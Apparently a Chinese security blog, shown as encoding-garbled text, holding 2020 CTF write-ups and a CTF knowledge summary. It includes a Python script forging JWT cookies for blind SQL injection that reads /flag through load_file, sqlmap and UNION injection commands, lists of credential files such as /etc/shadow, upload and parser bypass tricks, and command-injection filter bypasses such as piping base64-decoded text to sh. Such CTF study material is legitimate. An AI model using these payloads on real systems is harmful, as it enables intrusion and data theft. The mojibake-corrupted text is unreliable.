jwtæ³¨å…¥ã€javaé€†å‘ã€æ‚é¡¹ã€ç­¾åˆ° é¢˜ç›®åºå· 16 é¢˜ç›®åç§° js_onæ“ä½œå†…å®¹ï¼šè®¿é—®é¡µé¢å°è¯•å¼±å£ä»¤è¿›è¡Œç™»å½• æµ‹è¯•å‡º è´¦å·admin å¯†ç adminå¯ä»¥ç™»å½•è¿›é¡µé¢å‘ç°æœ‰ä¸ªkeyå€¼ æ¨æµ‹ä¸å…¨å›½ä¿¡å®‰æ¯”èµ›CISCN2018çš„webé¢˜easyweb ç±»ä¼¼ æ˜¯åˆ©ç”¨JWTä¼ªé€ cookie è®¿é—®https://jwt.ioç½‘ç«™ å°†adminé¡µé¢çš„tokenå€¼è¿›è¡Œå¸¦å…¥ å³è¾¹å›æ˜¾å®Œä¿¡æ¯å ç„¶åå°† keyå€¼å¤åˆ¶è¿›VERIFY SIGNATURE ä»£ç æ¡†ä¸­ åŒæ—¶åœ¨ user å˜é‡ä¸­ æ„é€ æ³¨å…¥è¯­å¥ æµ‹è¯•æ³¨å…¥è¯­å¥ä¸º adminâ€™and (select counet(*) from admin)&gt;0ï¼ŒçŒœæµ‹æ˜¯å¦æœ‰adminè¡¨ ï¼ˆå°†ä¼ªé€ çš„tokenæ›¿æ¢åˆ°admin é¡µé¢æŠ“çš„åŒ…ä¸­ï¼‰,å‘ç°å›æ˜¾ get out heacker è¯æ˜æ€è·¯æ­£ç¡®ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ æ³¨å…¥payload å°è¯•äº†å„ç§æ³¨å…¥è¯­å¥å‘ç°ä¸ç®¡æ€ä¹ˆæ„é€  åªè¦å‡ºç°å•å¼•å·å’Œselect&amp;unionå°±ä¼šè¢«æ£€æµ‹è¿‡æ»¤ã€‚çŒœæµ‹æ˜¯å¦æ˜¯è¯»å–æ–‡ä»¶ï¼Œç”¨+æ›¿æ¢ç©ºæ ¼ï¼Œæ„é€ payloadä¸ºï¼Œ adminâ€™and+substr(load_file(â€˜/flagâ€™),1,1)=1#ï¼Œå°è¯•åˆ¤æ–­å¯èƒ½å­˜åœ¨çš„å­—ç¬¦ä¸² å†™pyè„šæœ¬ å®ç°æ‰¹é‡çŒœè§£ã€‚ 123456789101112131415161718192021222324252627282930313233343536#!/usr/local/env pythonimport requestsimport jwturl = &quot;http://61c689d7c58b46fbaa40097072b1e5b90859d0e18970409f.cloudgame2.ichunqiu.com/index.php&quot;chars = '{}-abcdefghigklmnopqrstuvwxyz0123456789'for i in range(1,45): for j in range(len(chars)): header = { &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; } payload = { &quot;user&quot;: &quot;admin'and+substr(load_file('/flag'),{num},1)='{ch}'#&quot;.format(num=i,ch=chars[j]), &quot;news&quot;: &quot;key:xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6&quot; } encode_jwt = jwt.encode(payload, 'xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6', algorithm='HS256', headers = header) cookies_data0 = { '__jsluid_h':'7624a174d2449ec0266b2b5b4b93cb80', 'token': encode_jwt.decode() } headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' } # print(encode_jwt.decode()) r = requests.get(url, headers = headers, cookies = cookies_data0) if &quot;key:xRt&quot; in r.text: print(chars[j]) else: pass é¢˜ç›®åºå· 3 é¢˜ç›®åç§° ransomæ“ä½œå†…å®¹ï¼šåˆ†ææ—¥å¿—ï¼ŒæŒ‰äº‹ä»¶idï¼Œå…ˆè¿‡æ»¤äº‹ä»¶id528ï¼Œæ‰¾åˆ°æ‰€æœ‰ç™»é™†å¤±è´¥çš„æƒ…å†µã€‚ æ‰¾åˆ°æ”»å‡»è€…idä¸º192.200.200.40 æ ¹æ®æç¤ºï¼šrdpæœ€åç™»å½•æˆåŠŸçš„æƒ…å†µã€‚è¿‡æ»¤å…³é”®è¯rdpï¼Œåœ¨ç»“æœä¸­æ‰¾åˆ°192.200.200.40çš„æœ€åä¸€æ¬¡ç™»å½•ä¿¡æ¯ã€‚ æ ¹æ®ä¿¡æ¯æ‰“å¼€rdp.exeå›ç­”é—®é¢˜ï¼Œå¾—åˆ°flag é¢˜ç›®åºå· 1 é¢˜ç›®åç§° ç­¾åˆ°æ“ä½œå†…å®¹ï¼šæ‰“æ¸¸æˆé€šå…³è‡³p14ï¼Œè¾“å…¥æœ¬é˜Ÿtokenï¼Œè¾“å…¥f12ï¼ŒæŸ¥çœ‹å…ƒç´ å¾—åˆ°flag é¢˜ç›®åºå· 15 é¢˜ç›®åç§° javaæ“ä½œå†…å®¹ï¼šæŠŠapkç”¨jebæ‰“å¼€. ç¡®å®šMainActivity, æ‰¾åˆ°åˆ¤æ–­çš„å‡½æ•°. åˆ†æfuncaå‡½æ•° é‡ç‚¹åˆ†ææ ‡çš„1,2,3å‡½æ•°. æ–¹æ³•3å†…å®¹ç®€å•,å°±æ˜¯base64çš„åŠ å¯†. æ–¹æ³•2ä¸ºè¾“å…¥çš„å­—èŠ‚æ•°ç»„,åˆ†åˆ«è¿›è¡Œå¼‚æˆ–22å’Œä»£ç ä¸­ç»™å‡ºçš„æ•´å½¢æ•°ç»„. æ–¹æ³•1ä¸ºåŠ å¯†.ä½†æ˜¯åœ¨å¼€å§‹çš„ä½¿ç”¨ä¼šåœ¨è¾“å…¥çš„å­—ç¬¦ä¸²åé¢è¿½åŠ æœªçŸ¥é•¿åº¦çš„å†…å®¹. åŠ å¯†çš„æ—¶å€™æ›¿æ¢äº†å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ æ ¹æ®æ–¹æ³•1~3å†™å‡ºé€†å‡½æ•°, æ‰“å°å‡ºflag. Apkæ±‡ç¼–é‡æ„å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package org.nisodaisuki.ctf;import androidx.appcompat.app.AppCompatActivity;import java.security.Key;import android.os.Bundle;import android.util.Base64;import android.util.Log;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;public class MainActivity extends AppCompatActivity{ @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Log.d(&quot;ccccc&quot;, &quot;------------------------------------------&quot;); String ddd = &quot;VsBDJCvuhD65/+sL+Hlf587nWuIa2MPcqZaq7GMVWI0Vx8l9R42PXWbhCRftoFB3&quot;; byte[] encode = Base64.decode(ddd.getBytes(), Base64.NO_WRAP); int[] s = new int[] { 0xD6, 0x90, 0xE9, 0xFE, 204, 0xE1, 61, 0xB7, 22, 0xB6, 43, 103, 20, 0xC2, 40, 0xFB, 44, 5, 43, 103, 0x9A, 0x76, 42, 190, 4, 0xC3, 43, 103, 170, 68, 19, 38, 73, 0x86, 43, 103, 0x99, 0x9C, 66, 80, 0xF4, 0x91, 80, 103, 0xEF, 0x98, 0x7A, 98, 50, 0xD6 } ; int len = 0; System.out.println(&quot;length---------------&quot; + encode.length);; while (len &lt; encode.length) { encode[len] = (byte)(encode[len] ^ s[len]); len++; } len = 0; while (len &lt; encode.length) { encode[len] = (byte)(encode[len] ^ 22); len++; } /* * public static final int ENCRYPT_MODE = 1; public static final int DECRYPT_MODE = 2; */ try { String sss = &quot;aes_check_key!@#&quot;; sss = sss.replace(&quot;e&quot;, &quot;o&quot;); SecretKeySpec v5_2 = new SecretKeySpec(sss.getBytes(), &quot;AES&quot;); Cipher v6 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); v6.init(Cipher.DECRYPT_MODE, ((Key)v5_2)); encode = v6.doFinal(encode); } catch(Exception v5_1) { System.out.println(&quot;Exception v5_1---------------&quot; + encode.length); } System.out.println(&quot;length---------------&quot; + encode.length); int dfdsf = encode.length; for (int i = 0; i &lt; dfdsf; i++) { byte[] tt = new byte[dfdsf-i]; System.arraycopy(encode, 0, tt, 0, dfdsf-i); String dessssstring = new String(tt); // System.out.println(&quot;-----------------------&quot;+dessssstring); } }}","link":"/2020/05/22/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-2020wdcup-xuanwuteam/"},{"title":"CTFçŸ¥è¯†ç‚¹æ€»ç»“","text":"å¸¸è§CTFçŸ¥è¯†ç‚¹çš„æ€»ç»“ ä¿¡æ¯æ”¶é›†å¸¸è§çš„ä¿¡æ¯æ”¶é›†æ‰‹æ®µâ€‹ webæ‰«æå™¨ï¼šå¾¡å‰‘ã€awvs æ”¶é›†ç«™ç‚¹ç›®å½•ï¼Œè·å–é‡è¦ç«™ç‚¹ä¿¡æ¯æ–‡ä»¶ã€‚å¦‚åå°ã€çˆ¬è™«æ–‡ä»¶ã€‚ â€‹ nmapæ‰«æï¼šç«™ç‚¹æœåŠ¡å™¨ç«¯å£ã€æœåŠ¡å¼€æ”¾æƒ…å†µã€æ‰€ç”¨ä¸­é—´ä»¶çš„ç‰ˆæœ¬è¯¦æƒ… â€‹ åšé¢˜æŠ€å·§â€‹ æºç åˆ†æï¼ŒæŸ¥çœ‹æºç æ˜¯å¦æœ‰ä»€ä¹ˆå¯ç–‘çš„æ³¨é‡Šä¿¡æ¯ã€‚ â€‹ æ‰«æå™¨æ”¶é›†ä¿¡æ¯ã€‚ â€‹ è®¿é—®å¯ä»¥æ–‡ä»¶æˆ–è€…é¡µé¢ã€‚ â€‹ CMSç«™ç‚¹å¸¸è§cmså­˜åœ¨çš„ä¸€äº›æ–‡ä»¶ï¼Œå®‰è£…å®Œæˆåä¸ºåŠæ—¶åˆ é™¤ï¼Œé€ æˆç«™ç‚¹è¢«ç¯¡æ”¹ã€‚ â€‹ å¦‚ï¼šinstall/install.php data/install.lock â€‹ å¼±å£ä»¤çˆ†ç ´å¸¸è§çš„ï¼šadminã€admin123ã€admin123456ã€1q2w3e4rã€‚ã€‚ã€‚ â€‹ ä½¿ç”¨butpsuiteæŠ“åŒ…çˆ†ç ´ã€‚intruder â€‹ sqlæ³¨å…¥sqlæ³¨å…¥çš„äº§ç”ŸåŸå› ï¼šâ€‹ ç”±äºæœåŠ¡å™¨æ¥æ”¶ç”¨æˆ·æ•°æ®å¹¶ä¸”æ‹¼æ¥äº†ç”¨æˆ·çš„å¯ç–‘sqlä»£ç ã€‚å¹¶ä¸”æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå°†sqlè¯­å¥å¸¦å…¥æŸ¥è¯¢ã€‚ äº†è§£å…¶ä¸­çš„å±å®³æ€§ï¼šâ€‹ æ•°æ®åº“ä¿¡æ¯æ³„éœ²ï¼Œç”¨æˆ·é‡è¦çš„é¥®é£Ÿæ•°æ®ã€‚ â€‹ ç½‘é¡µç¯¡æ”¹ â€‹ ç½‘ç«™è¢«æŒ‚é©¬ â€‹ æ•°æ®åº“è¢«æ¶æ„æ“ä½œ â€‹ æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ å¸¸è§çš„æ³¨å…¥ç±»å‹ï¼šâ€‹ å¯»æ‰¾æ³¨å…¥ç‚¹ï¼šåŠ¨æ€é¡µé¢ä¸æ•°æ®åº“äº¤äº’ã€‚ â€‹ æ–¹æ³•ï¼šå•å¼•å·æ³•ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰é”™è¯¯è¿”å›and 1=1 å’Œ and 1=2 â€‹ åŸºäºæ—¶é—´ç±»å‹çš„ç›²æ³¨ï¼šæµ‹è¯•æ–¹æ³•ï¼ŒæŸ¥çœ‹é¡µé¢è¿”å›å»¶æ—¶ â€‹ åšé¢˜ï¼šé¦–å…ˆåŸºæœ¬çš„åˆ¤æ–­æ³¨å…¥,æ‰§è¡Œæ³¨å…¥è¯­å¥ï¼Œè¿›è¡Œæ³¨å…¥æ“ä½œï¼Œå¯ä»¥æ‰‹æ³¨ï¼Œå¯è‡ªåŠ¨åŒ–æ³¨å…¥ â€‹ POSTå‹æ³¨å…¥ â€‹ sqlmapè·‘å‡ºæ³¨å…¥ç‚¹æ—¶ï¼Œçˆ†åº“ã€è¡¨ã€å­—æ®µã€å†…å®¹çš„æ­¥éª¤â€‹ python sqlmap.py -u â€œhttp://172.16.5.107/stage/5/get_info.php?title=xiaoshiniudao&amp;id=1&quot; â€‹ çˆ†åº“ï¼š â€“dbs â€‹ çˆ†è¡¨ï¼š -D databasename â€“tables â€‹ çˆ†å­—æ®µï¼š -D databasename -T tablename â€“columns â€‹ çˆ†å­—æ®µçš„å†…å®¹ï¼š -D databasename -T tablename -C â€œâ€”â€”ï¼Œâ€”â€”â€ â€“dump â€‹ unionè”åˆæŸ¥è¯¢çŒœè§£åº“ï¼Œè¡¨ï¼Œåï¼Œå­—æ®µ 1 union select table_name from information_schema.schemata åº“ 1 union select table_name from information_schema.tables where table_schema=â€™xxxxxâ€™ åº“ä¸­çš„è¡¨ 1 union select column_name from information_schema.columns where table_schema=â€™xxxxxâ€™ and table_name=â€™xxxxâ€™ 1 union select xxxx from xxxx å¸¸è§æŸ¥è¯¢å‡½æ•° version() MySQL ç‰ˆæœ¬ user() æ•°æ®åº“ç”¨æˆ·å database() æ•°æ®åº“å @@datadir æ•°æ®åº“è·¯å¾„ @@version_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬ hex() æŠŠåè¿›åˆ¶è½¬ä¸ºåå…­è¿›åˆ¶ concat() è¿æ¥å­—ç¬¦ä¸² ascii() asciiç¼–ç  lengthï¼ˆ) è·å–é•¿åº¦ substring() midï¼ˆï¼‰ å–å‡ºå­—ç¬¦ä¸² group_concat() è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸² ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ® updatexml()ã€extractvalue() ç”¨äºæŠ¥é”™æ³¨å…¥ sleepï¼ˆï¼‰ ä¼‘çœ  xss è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆcross-site scriptingï¼‰â€‹ å‡ºç°äºwebåº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´ã€‚å¯¹ç”¨æˆ·è¾“å…¥è¿‡æ»¤ä¸è¶³ã€‚æ’å…¥æ¶æ„è„šæœ¬ã€‚ å±å®³cookieåŠ«æŒã€ä¼šè¯åŠ«æŒã€é’“é±¼æ¬ºéª— æ”»å‡»æ¡ä»¶a) éœ€è¦å‘webé¡µé¢æ³¨å…¥æ¶æ„ä»£ç  bï¼‰è¿™äº›æ¶æ„ä»£ç èƒ½å¤Ÿè¢«æµè§ˆå™¨æˆåŠŸæ‰§è¡Œ åˆ†ç±»â€‹ åå°„å‹ï¼šä¹Ÿç§°éæŒä¹…å‹ã€å‚æ•°å‹è·¨ç«™è„šæœ¬ â€‹ æ¶æ„ä»£ç æ²¡æœ‰ä¿å­˜åœ¨ç›®æ ‡ç«™ç‚¹ï¼Œé€šè¿‡å¼•è¯±ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç›®æ ‡ç½‘ç«™çš„æ¶æ„é“¾æ¥æ¥å®æ–½æ”»å‡»ã€‚ â€‹ å­˜å‚¨å‹ï¼š â€‹ XSSå­˜å‚¨å‹æ”»å‡»ï¼Œæ¶æ„ä»£ç è¢«ä¿å­˜åˆ°ç›®æ ‡ç½‘ç«™çš„æœåŠ¡å™¨ä¸­ï¼Œè¿™ç§æ”» å‡»å…·æœ‰è¾ƒå¼ºçš„ç¨³å®šæ€§å’ŒæŒä¹…æ€§ï¼Œæ¯”è¾ƒå¸¸è§åœºæ™¯æ˜¯åœ¨åšå®¢ï¼Œè®ºå›ç­‰ç¤¾äº¤ç½‘ ç«™ä¸Šï¼Œä½†OAç³»ç»Ÿï¼Œå’ŒCRMç³»ç»Ÿä¸Šä¹Ÿèƒ½çœ‹åˆ°å®ƒèº«å½±ï¼Œæ¯”å¦‚ï¼šæŸCRMç³» ç»Ÿçš„å®¢æˆ·æŠ•è¯‰åŠŸèƒ½ä¸Šå­˜åœ¨XSSå­˜å‚¨å‹æ¼æ´ï¼Œé»‘å®¢æäº¤äº†æ¶æ„æ”»å‡»ä»£ç ï¼Œ å½“ç³»ç»Ÿç®¡ç†å‘˜æŸ¥çœ‹æŠ•è¯‰ä¿¡æ¯æ—¶æ¶æ„ä»£ç æ‰§è¡Œï¼Œçªƒå–äº†å®¢æˆ·çš„èµ„æ–™ï¼Œç„¶è€Œ ç®¡ç†å‘˜æ¯«ä¸çŸ¥æƒ…ï¼Œè¿™å°±æ˜¯å…¸å‹çš„XSSå­˜å‚¨å‹æ”»å‡»ã€‚ DOMå‹ï¼š æ–‡ä»¶åŒ…å«åŸç†ä»£ç é€šè¿‡phpå‡½æ•°æ¥åŒ…å«å…¶ä»–phpçš„ä»£ç æ–‡ä»¶ï¼Œå¹¶ä¸”å½“æˆphpä»£ç æ¥æ‰§è¡Œï¼Œä½¿å¾—ä»£ç é‡å¤åˆ©ç”¨ï¼Œé™ä½å¼€å‘çš„å¼€å‘æˆæœ¬ã€‚ å¸¸è§æ–‡ä»¶åŒ…å«å‡½æ•°include()ã€include_once()ã€require()ã€require_once() æ¼æ´äº§ç”ŸåŸå› æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡ä¸¥æ ¼è¿‡æ»¤æ´»æˆ–è€…ä¸¥æ ¼å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶åŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´æ‰§è¡Œäº†éé¢„æœŸçš„ä»£ç ã€‚ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´â€‹ aï¼‰æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å« â€‹ b) å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ windowsï¼š c:\\boot.ini // æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ c:\\windows\\system32\\inetsrv\\MetaBase.xml // IISé…ç½®æ–‡ä»¶ c:\\windows\\repair\\sam // å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  c:\\ProgramFiles\\mysql\\my.ini // MySQLé…ç½® c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL rootå¯†ç  c:\\windows\\php.ini // php é…ç½®ä¿¡æ¯ Linuxï¼š /etc/passwd // è´¦æˆ·ä¿¡æ¯ /etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶ /usr/local/app/apache2/conf/httpd.conf // Apache2é»˜è®¤é…ç½®æ–‡ä»¶ /usr/local/app/apache2/conf/extra/httpd-vhost.conf // è™šæ‹Ÿç½‘ç«™é…ç½® /usr/local/app/php5/lib/php.ini // PHPç›¸å…³é…ç½® /etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶ /etc/my.conf // mysql é…ç½®æ–‡ä»¶ /var/log/ â€‹ cï¼‰sessionæ–‡ä»¶åŒ…å« â€‹ d) æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡ â€‹ %00æˆªæ–­ â€‹ æ¡ä»¶ï¼šmagic_quotes_gpc = Off phpç‰ˆæœ¬&lt;5.3.4 è¿œç¨‹æ–‡ä»¶åŒ…å«æ”¯æŒçš„åè®®å’Œå°è£…åè®® //å®˜æ–¹æ–‡æ¡£ file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ http:// â€” è®¿é—® HTTP(s) ç½‘å€ ftp:// â€” è®¿é—® FTP(s) URLs php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ zlib:// â€” å‹ç¼©æµ data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ phar:// â€” PHP å½’æ¡£ ssh2:// â€” Secure Shell 2 rar:// â€” RAR ogg:// â€” éŸ³é¢‘æµ expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ â€‹ â€‹ ä»»æ„æ–‡ä»¶ä¸Šä¼ å‰ç«¯jsä¸Šä¼ æ£€æµ‹ç»•è¿‡â€‹ åˆ¤æ–­æ–¹æ³•ï¼šä½¿ç”¨bpæŠ“åŒ…ï¼Œç›´æ¥ä¸Šä¼ åç¼€ä¸ºphpçš„æ–‡ä»¶ï¼Œå‘ç°bpæ²¡æœ‰æŠ“åˆ°åŒ…ï¼Œä½†æ˜¯å·²ç»å¼¹çª—æ˜¾ç¤ºä¸Šä¼ æ–‡ä»¶æ ¼å¼ä¸å…è®¸ã€‚ â€‹ ç»•è¿‡æ–¹æ³•ï¼š â€‹ 1ï¼‰ä¸Šä¼ åˆæ³•åç¼€çš„æ–‡ä»¶ã€‚ä½¿ç”¨bpæˆªåŒ…æ”¹åç¼€åã€‚å³å¯ç»•è¿‡ã€‚ â€‹ 2ï¼‰å®¡æŸ¥å…ƒç´ ï¼Œä¿®æ”¹jséªŒè¯ä»£ç çš„ â€‹ 3ï¼‰åˆ é™¤å¯¹jséªŒè¯è„šæœ¬çš„è°ƒç”¨ æœåŠ¡å™¨ç«¯MIMEç±»å‹æ£€æµ‹ç»•è¿‡â€‹ æ£€æµ‹åŸç†ï¼šå½“ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶è‡³æœåŠ¡ç«¯æ—¶ï¼ŒæœåŠ¡ç«¯ç¨‹åºä¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„MIMEç±»å‹ â€‹ ç»•è¿‡æ–¹æ³•:MIMEç±»å‹åœ¨HTTPè¯·æ±‚å­—æ®µé‡Œçš„Content-typeå­—æ®µï¼Œä¿®æ”¹è¯¥å­—æ®µçš„å€¼å³å¯ç»•è¿‡ é»‘åå•ç»•è¿‡â€‹ æ£€æµ‹åŸç†ï¼šæœåŠ¡å™¨ç«¯æ ¹æ®ä¸€ä»½åç¼€åçš„åå•æ¥åˆ¤æ–­æ˜¯å¦å…è®¸å½“å‰æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œè‹¥åœ¨åå•ä¸­ï¼Œå°±ç¦æ­¢è¯¥æ–‡ä»¶ä¸Šä¼  â€‹ ç»•è¿‡æ–¹æ³•ï¼š â€‹ 1ï¼‰æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ã€‚ï¼ˆpHP Aspï¼‰ â€‹ 2ï¼‰åå•åˆ—è¡¨ç»•è¿‡ â€‹ 3ï¼‰ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ã€‚ windowså¯ä»¥è‡ªåŠ¨ä¿®æ”¹ã€‚ ä½†æ˜¯linux|unixæ²¡æœ‰è¿™ä¸ªç‰¹æ€§ 1.jpg 1.jpg. 1.jpg.abc â€‹ 4ï¼‰0x00æˆªæ–­ç»•è¿‡ â€‹ 5ï¼‰.htaccessæ–‡ä»¶æ”»å‡» â€‹ 6ï¼‰è§£æè°ƒç”¨/æ¼æ´ç»•è¿‡ ç™½åå•ç»•è¿‡æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹ç»•è¿‡webåº”ç”¨ç¨‹åºè§£æç»•è¿‡â€‹ 1ï¼‰apacheè§£ææ¼æ´ â€‹ è§£æï¼štest.php.(ä»»æ„ä¸å±äºé»‘åå•ä¸”ä¹Ÿä¸å±äºApacheè§£æç™½åå•çš„åç§°)ï¼Œæ¯”å¦‚test.php.lala â€‹ æè¿°ï¼šä¸€ä¸ªæ–‡ä»¶åä¸ºtest.x1.x2.x3çš„æ–‡ä»¶ï¼Œapacheä¼šä»x3çš„ä½ç½®å¼€å§‹å°è¯•è§£æï¼Œå¦‚æœx3ä¸å±äºapacheèƒ½å¤Ÿè§£æçš„æ‰©å±•åï¼Œé‚£ä¹ˆapacheä¼šå°è¯•å»è§£æx2ï¼Œç›´åˆ°èƒ½å¤Ÿè§£æåˆ°èƒ½å¤Ÿè§£æçš„ä¸ºæ­¢ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™ã€‚ â€‹ 2ï¼‰ISSè§£ææ¼æ´ â€‹ è§£æï¼štest.asp/(ä»»æ„æ–‡ä»¶å)|test.aspï¼›(ä»»æ„æ–‡ä»¶å) | (ä»»æ„æ–‡ä»¶å)/(ä»»æ„æ–‡ä»¶å).php â€‹ æè¿°ï¼šIIS6.0åœ¨è§£æaspæ ¼å¼çš„æ—¶å€™æœ‰ä¸¤ä¸ªè§£ææ¼æ´ï¼Œä¸€ä¸ªæ˜¯å¦‚æœç›®å½•ååŒ…å«â€.aspâ€å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶éƒ½ä¼šæŒ‰ç…§aspå»è§£æï¼Œå¦ä¸€ä¸ªæ˜¯åªè¦æ–‡ä»¶åä¸­å«æœ‰â€.asp;â€ä¼šä¼˜å…ˆæŒ‰aspæ¥è§£æ;IIS7.0/7.5æ˜¯å¯¹phpè§£ææ—¶æœ‰ä¸€ä¸ªç±»ä¼¼äºNginxçš„è§£ææ¼æ´ï¼Œå¯¹ä»»æ„æ–‡ä»¶ååªè¦åœ¨URLåé¢è¿½åŠ ä¸Šå­—ç¬¦ä¸²â€/ä»»æ„æ–‡ä»¶å.phpâ€å°±ä¼šæŒ‰ç…§phpçš„æ–¹å¼å»è§£æï¼› â€‹ 3ï¼‰nginxè§£ææ¼æ´**** â€‹ è§£æï¼š (ä»»æ„æ–‡ä»¶å)/(ä»»æ„æ–‡ä»¶å).php | (ä»»æ„æ–‡ä»¶å)%00.php â€‹ æè¿°ï¼šç›®å‰Nginxä¸»è¦æœ‰è¿™ä¸¤ç§æ¼æ´ï¼Œä¸€ä¸ªæ˜¯å¯¹ä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ /ä»»æ„æ–‡ä»¶å.phpçš„è§£ææ¼æ´ï¼Œæ¯”å¦‚åŸæœ¬æ–‡ä»¶åæ˜¯test.jpgï¼Œå¯ä»¥æ·»åŠ ä¸ºtest.jpg/x.phpè¿›è¡Œè§£ææ”»å‡»ã€‚è¿˜æœ‰ä¸€ç§æ˜¯å¯¹ä½ç‰ˆæœ¬çš„Nginxå¯ä»¥åœ¨ä»»æ„æ–‡ä»¶ååé¢æ·»åŠ %00.phpè¿›è¡Œè§£ææ”»å‡»ã€‚ å‘½ä»¤æ‰§è¡Œå¸¸è§shellæ‹¼æ¥ç¬¦ï¼ˆ&amp;ã€&amp;&amp;ã€|ã€||ï¼‰A&amp;B: é¡ºåºæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œè€Œä¸ç®¡å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸ A&amp;&amp;B: é¡ºåºæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå½“ç¢°åˆ°æ‰§è¡Œå‡ºé”™çš„å‘½ä»¤åå°†ä¸æ‰§è¡Œåé¢çš„å‘½ä»¤ A|B: ç®¡é“å‘½ä»¤ï¼Œå¦‚ï¼šdir . /s/a | find /c &quot;.exe&quot; è¡¨ç¤ºï¼šå…ˆæ‰§è¡Œ dir å‘½ä»¤ï¼Œå¯¹å…¶è¾“å‡ºçš„ç»“æœæ‰§è¡Œåé¢çš„ find å‘½ä»¤ A||B: é¡ºåºæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå½“ç¢°åˆ°æ‰§è¡Œæ­£ç¡®çš„å‘½ä»¤åå°†ä¸æ‰§è¡Œåé¢çš„å‘½ä»¤ å¸¸è§ç»•è¿‡æ–¹å¼ç©ºæ ¼ç»•è¿‡ 123456789$IFS$IFS$1${IFS}$IFS$9&lt; æ¯”å¦‚cat&lt;a.tct:è¡¨ç¤ºcat a.txt&lt;&gt;{cat,flag.php} //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½ï¼Œéœ€è¦ç”¨{}æ‹¬èµ·æ¥%20%09 ç»•è¿‡å…³é”®å­— 123456789101112wh\\o\\ami //åæ–œçº¿ç»•è¿‡who&quot;a&quot;mi //åŒå¼•å·ç»•è¿‡whoa'm'i //å•å¼•å·ç»•è¿‡whoam``i //åå¼•å·ç»•è¿‡echo d2hvYW1p|base64 -d|sh //base64ç»•è¿‡,å…¶ä¸­d2hvYW1pæ˜¯whoamiçš„base64ç¼–ç echo d2hvYW1p|base64 -d|bash//base64ç»•è¿‡,å…¶ä¸­d2hvYW1pæ˜¯whoamiçš„base64ç¼–ç `echo d2hvYW1p|base64 -d` //å°†å…¶base64è§£ç ,ç„¶åç”¨åå¼•å·æ¥æ‰§è¡Œå‘½ä»¤echo 77686F616D69 | xxd -r -p | bash //hexç»•è¿‡,å…¶ä¸­77686F616D69æ˜¯whoamiçš„hexç¼–ç //$*å’Œ$@ï¼Œ$x(x ä»£è¡¨ 1-9),${x}(x&gt;=10) :æ¯”å¦‚ca${21}t a.txtè¡¨ç¤ºcat a.txt åœ¨æ²¡æœ‰ä¼ å…¥å‚æ•°çš„æƒ…å†µä¸‹,è¿™äº›ç‰¹æ®Šå­—ç¬¦é»˜è®¤ä¸ºç©º,å¦‚ä¸‹:wh$1oamiwho$@amiwhoa$*mi ä»»æ„å­—ç¬¦æ’å…¥æ‰§è¡Œï¼ˆå¯ç»•è¿‡å‘½ä»¤å’Œæ–‡ä»¶åï¼‰ 